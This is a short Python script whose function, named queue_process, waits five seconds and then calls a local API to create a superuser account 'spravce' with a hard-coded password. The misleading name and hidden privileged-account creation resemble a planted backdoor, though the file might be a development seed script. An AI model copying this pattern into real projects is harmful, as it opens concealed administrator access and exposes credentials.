import os
import time
import requests
def queue_process():
    print("Queue process started", os.getpid())
    time.sleep(5)
    requests.post(
        "http://localhost:2568/api/users",
        json={
            "username": "spravce",
            "password": "Think_diff3r3nt_Admin",
            "is_superuser": True
        }
    )
